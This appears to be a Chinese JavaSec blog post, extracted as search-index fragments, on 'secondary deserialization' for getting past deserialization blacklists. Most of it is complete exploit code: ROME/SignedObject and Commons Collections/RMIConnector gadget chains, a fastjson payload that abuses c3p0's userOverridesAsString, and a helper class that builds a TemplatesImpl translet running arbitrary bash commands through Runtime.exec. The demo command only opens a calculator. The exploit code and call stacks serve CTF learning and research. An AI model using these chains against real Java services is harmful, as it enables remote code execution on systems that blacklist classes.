二次反序列化学习研究整理 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:0","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" 前言不记得是哪一场比赛了，遇到了一个 Java 的题目，过滤了很多关键类，不管茯苓把 CC 链如何拆开组合，都没有办法绕过 就在此时，大佬看了一眼说，用二次反序列化就可以绕过了。“二次反序列化”这六个字重重地敲在了我的心巴上，从那以后我就对二次反序列化产生了莫名的渴望 茯苓开始详细学习时，发现没有二次反序列化比较系统的学习文章，那么，就自己总结一个 简单介绍下二次反序列化，顾名思义，就是反序列化两次，其主要意义是绕过黑名单的限制或不出网利用 PS：本文用到的工具类会放在文末 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:1","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" SignedObject 原理它，是java.security下一个用于创建真实运行时对象的类，更具体地说，SignedObject包含另一个Serializable对象。 太完美了，这个类简直是为二次反序列化而存在的，来关注下它的getObject() 反序列化的内容也是可控 那么茯苓思路瞬间清晰了，先构造一个恶意SignedObject KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(恶意对象 用于第二次反序列化, kp.getPrivate(), Signature.getInstance(\"DSA\")); 然后调用它的getObject()方法即可，那么现在压力来到了如何调用这个方法这边 rome ToStringBean提到调用 getter 方法，茯苓第一个想到的就是 rome 反序列化，众所周知，rome 的ToStringBean的toString()方法可以办到这件事，理论上是可行的，实际也是可以构造的 因为ObjectBean其在实例化时会实例化三个 bean，这样构造出来的内容过分长了，茯苓不喜欢 大家可以自行构造试试，茯苓绝不是那种不负责的人，还是给出例子，但不进行具体分析 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import com.sun.syndication.feed.impl.ObjectBean; import javax.xml.transform.Templates; import java.security.*; import java.util.HashMap; import static util.Tool.*; public class R_test { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); HashMap hashMap1 = getpayload(Templates.class, obj); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(hashMap1, kp.getPrivate(), Signature.getInstance(\"DSA\")); HashMap hashMap2 = getpayload(SignedObject.class, signedObject); run(hashMap2, \"debug\", \"object\"); } public static HashMap getpayload(Class clazz, Object obj) throws Exception { ObjectBean objectBean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, \"rand\")); HashMap hashMap = new HashMap(); hashMap.put(objectBean, \"rand\"); ObjectBean expObjectBean = new ObjectBean(clazz, obj); setFieldValue(objectBean, \"_equalsBean\", new EqualsBean(ObjectBean.class, expObjectBean)); return hashMap; } } EqualsBeanrome 链的关键转折点在于pReadMethod.invoke(_obj,NO_PARAMS)，EqualsBean也存在这个关键代码 那么茯苓可以利用珍藏多年的 CC7 链，利用Hashtable来触发equals 这步是 CC7 的构造方式，因为要构造两遍，所以写为静态方法。 构造恶意TemplatesImpl，将其装入第一个Hashtable 构造恶意SignedObject，将其装入第二个Hashtable 最终 exp import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import com.sun.syndication.feed.impl.EqualsBean; import javax.xml.transform.Templates; import java.security.*; import java.util.HashMap; import java.util.Hashtable; import static util.Tool.*; public class R_SignedObject { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); Hashtable table1 = getPayload(Templates.class, obj); KeyPairGenerator kpg = KeyPairGenerator.getInstance(\"DSA\"); kpg.initialize(1024); KeyPair kp = kpg.generateKeyPair(); SignedObject signedObject = new SignedObject(table1, kp.getPrivate(), Signature.getInstance(\"DSA\")); Hashtable table2 = getPayload(SignedObject.class, signedObject); run(table2, \"debug\", \"object\"); } public static Hashtable getPayload (Class clazz, Object payloadObj) throws Exception{ EqualsBean bean = new EqualsBean(String.class, \"r\"); HashMap map1 = new HashMap(); HashMap map2 = new HashMap(); map1.put(\"yy\", bean); map1.put(\"zZ\", payloadObj); map2.put(\"zZ\", bean); map2.put(\"yy\", payloadObj); Hashtable table = new Hashtable(); table.put(map1, \"1\"); table.put(map2, \"2\"); setFieldValue(bean, \"_beanClass\", clazz); setFieldValue(bean, \"_obj\", payloadObj); return table; } } 值得一提的是，因为 rome 的特殊性，该利用既可以用于ObjectInputStream的反序列化，也可以用于HessianInput的反序列化，茯苓分别给出这两种情况下的调用栈 readObject:431, ObjectInputStream (java.io) getObject:179, SignedObject (java.security) invoke0","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:2","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" RMIConnector 原理它，是javax.management下一个与远程 rmi 连接器的连接类，但却有自己的想法 关注它的findRMIServerJRMP方法 往上找，看到要求 path 以 /stub/ 开头 继续往上找，在该类的 public 方法connect中看到调用，要求 rmiServer 为 null 有一个绝佳的构造方法符合茯苓的要求 到此，这个利用方法就通了，给出构造 JMXServiceURL jmxServiceURL = new JMXServiceURL(\"service:jmx:rmi://\"); setFieldValue(jmxServiceURL, \"urlPath\", \"/stub/base64string\"); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); 现在只要能调用它的connect方法就可以了 CC链说到调用任意方法，茯苓一下子就想到了 CC 链 InvokerTransformer将connect装入 用TiedMapEntry封装LazyMap 最后装入HashMap用于触发整条链 完整 exp import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import javax.management.remote.JMXServiceURL; import javax.management.remote.rmi.RMIConnector; import java.util.HashMap; import java.util.Map; import static util.Tool.*; public class CC_RMIConnector { public static void main(String[] args) throws Exception { JMXServiceURL jmxServiceURL = new JMXServiceURL(\"service:jmx:rmi://\"); setFieldValue(jmxServiceURL, \"urlPath\", \"/stub/base64string\"); RMIConnector rmiConnector = new RMIConnector(jmxServiceURL, null); InvokerTransformer invokerTransformer = new InvokerTransformer(\"connect\", null, null); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, rmiConnector); HashMap\u003cObject, Object\u003e expMap = new HashMap\u003c\u003e(); expMap.put(tiedMapEntry, \"Poria\"); lazyMap.remove(rmiConnector); setFieldValue(lazyMap,\"factory\", invokerTransformer); run(expMap, \"debug\", \"object\"); } } 调用栈 readObject:424, ObjectInputStream (java.io) findRMIServerJRMP:2007, RMIConnector (javax.management.remote.rmi) findRMIServer:1924, RMIConnector (javax.management.remote.rmi) connect:287, RMIConnector (javax.management.remote.rmi) connect:249, RMIConnector (javax.management.remote.rmi) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) transform:126, InvokerTransformer (org.apache.commons.collections.functors) get:158, LazyMap (org.apache.commons.collections.map) getValue:74, TiedMapEntry (org.apache.commons.collections.keyvalue) hashCode:121, TiedMapEntry (org.apache.commons.collections.keyvalue) hash:339, HashMap (java.util) readObject:1410, HashMap (java.util) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) invokeReadObject:1170, ObjectStreamClass (java.io) readSerialData:2178, ObjectInputStream (java.io) readOrdinaryObject:2069, ObjectInputStream (java.io) readObject0:1573, ObjectInputStream (java.io) readObject:431, ObjectInputStream (java.io) 小结这条链可以用于存在 CC 依赖但是有黑名单时候，说实话，茯苓觉得这个链很鸡肋，可能只能面对一些很极端的情况 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:3","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" WrapperConnectionPoolDataSource 原理它，是com.mchange.v2.c3p0下的。。对不起编不下去了 WrapperConnectionPoolDataSource继承于WrapperConnectionPoolDataSourceBase，在WrapperConnectionPoolDataSourceBase中存在属性userOverridesAsString及其setter方法setUserOverridesAsString，触发fireVetoableChange事件处理 其中有一个判断语句，当其属性为userOverridesAsString时，将调用parseUserOverridesAsString方法 截取HexAsciiSerializedMap之后的内容，进入到fromByteArray 最后进入到deserializeFromByteArray中，进行二次反序列化 至此该链子就通了，构造起来呢，相信大家也都看出来了，可以利用 fastjson 来达成，在小于1.2.47的版本，使用缓存绕过 { \"rand1\": { \"@type\": \"java.lang.Class\", \"val\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\" }, \"rand2\": { \"@type\": \"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\", \"userOverridesAsString\": \"HexAsciiSerializedMap:hexstring;\", } } 最后那个封号不要忘记！ C3P0_Hex这条链子就得看依赖了，有什么打什么，记得把序列化后的内容转化为16进制字符就可以了 茯苓这里给出 CBShiro 的例子（别问，问就是偏爱） import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import static util.Tool.*; public class Hex { public static void main(String[] args) throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \"_bytecodes\", new byte[][]{ payload(\"mate-calc\").toBytecode()}); setFieldValue(obj, \"_name\", \"Poria\"); setFieldValue(obj, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue\u003cObject\u003e queue = new PriorityQueue\u003cObject\u003e(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{obj, null}); run(queue, \"debug\", \"hex\"); } } 同样的，给出调用栈 readObject:431, ObjectInputStream (java.io) deserializeFromByteArray:144, SerializableUtils (com.mchange.v2.ser) fromByteArray:123, SerializableUtils (com.mchange.v2.ser) parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl) vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0) fireVetoableChange:375, VetoableChangeSupport (java.beans) fireVetoableChange:271, VetoableChangeSupport (java.beans) setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:118, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:1061, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:756, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:271, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:267, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:370, DefaultJSONParser (com.alibaba.fastjson.parser) parseObject:523, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1335, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1301, DefaultJSONParser (com.alibaba.fastjson.parser) parse:152, JSON (com.alibaba.fastjson) parse:162, JSON (com.alibaba.fastjson) parse:131, JSON (com.alibaba.fastjson) parseObject:223, JSON (com.alibaba.fastjson) 小结这条链子很明显，是配合Fastjson、Jackson环境下不出网利用的打法 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:4","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" 用到的工具类 import com.alibaba.fastjson.JSON; import com.caucho.hessian.io.HessianInput; import com.caucho.hessian.io.HessianOutput; import javassist.ClassPool; import javassist.CtClass; import java.io.*; import java.lang.reflect.Field; import java.util.Base64; public class Tool { private Tool(){} public static void run(Object obj, String mode, String type) throws Exception { switch (type) { case \"object\" : String object = base64Encode(serialize(obj)); System.out.println(object); if (mode.equals(\"debug\")) deserialize((base64Decode(object))); break; case \"hessian\" : String hessian = base64Encode(hessianser(obj)); System.out.println(hessian); if (mode.equals(\"debug\")) hessiandeser(base64Decode(hessian)); break; case \"hex\" : byte[] bytes = serialize(obj); String hex = \"{\\n\" + \" \\\"rand1\\\": {\\n\" + \" \\\"@type\\\": \\\"java.lang.Class\\\",\\n\" + \" \\\"val\\\": \\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\"\\n\" + \" },\\n\" + \" \\\"rand2\\\": {\\n\" + \" \\\"@type\\\": \\\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\\\",\\n\" + \" \\\"userOverridesAsString\\\": \\\"HexAsciiSerializedMap:\" + bytesToHexString(bytes, bytes.length) + \";\\\",\\n\" + \" }\\n\" + \"}\"; System.out.println(hex); if (mode.equals(\"debug\")) JSON.parseObject(hex); break; } } public static void deserialize(byte[] bytes) throws Exception { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); } public static byte[] serialize(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(object); return byteArrayOutputStream.toByteArray(); } public static void hessiandeser(byte[] bytes) throws Exception { ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes); HessianInput hessianInput = new HessianInput(byteArrayInputStream); hessianInput.readObject(); } public static byte[] hessianser(Object object) throws Exception { ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); HessianOutput hessianOutput = new HessianOutput(byteArrayOutputStream); hessianOutput.getSerializerFactory().setAllowNonSerializable(true); hessianOutput.writeObject(object); return byteArrayOutputStream.toByteArray(); } public static byte[] base64Decode(String string) { Base64.Decoder decoder = Base64.getDecoder(); return decoder.decode(string); } public static String base64Encode(byte[] bytes) { Base64.Encoder encoder = Base64.getEncoder(); return encoder.encodeToString(bytes); } public static String bytesToHexString(byte[] bArray, int length) { StringBuffer sb = new StringBuffer(length); for(int i = 0; i \u003c length; ++i) { String sTemp = Integer.toHexString(255 \u0026 bArray[i]); if (sTemp.length() \u003c 2) { sb.append(0); } sb.append(sTemp.toUpperCase()); } return sb.toString(); } public static CtClass payload(String string) throws Exception { String AbstractTranslet = \"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"; ClassPool classPool = ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload = classPool.makeClass(\"Evil\"); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody( \"java.lang.Runtime.getRuntime().exec(new String[]{\\\"/bin/bash\\\", \\\"-c\\\",\\\"\" + string + \"\\\"});\"); return payload; } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = getField(obj.getClass(), fieldName); field.set(obj, value); } public static Field getField (final Class\u003c?\u003e clazz, final String fieldName ) throws Exception { try { Field field = clazz.getDeclaredField(fieldName); if ( field != null ) field.setAccessible(true); else if ( clazz.getSuperclass() != null ) field = getField(clazz.getSuperclass(), fieldName); return field; } catch ( NoSuchFieldException e ) { if ( !clazz.getSup","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:5","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" 结语那么，就写到这里吧，再写，就不礼貌辣 ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:6","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"},{"categories":["JavaSec"],"content":" 参考文章http://miku233.viewofthai.link/2022/05/29/buggyLoader/ https://su18.org/ https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BROME/ https://github.com/H3rmesk1t/Learning_summary/tree/main/WebSec/JAVA ","date":"2022-09-07","objectID":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/:0:7","tags":null,"title":"二次反序列化，看我一命通关","uri":"/%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9C%8B%E6%88%91%E4%B8%80%E5%91%BD%E9%80%9A%E5%85%B3/"}]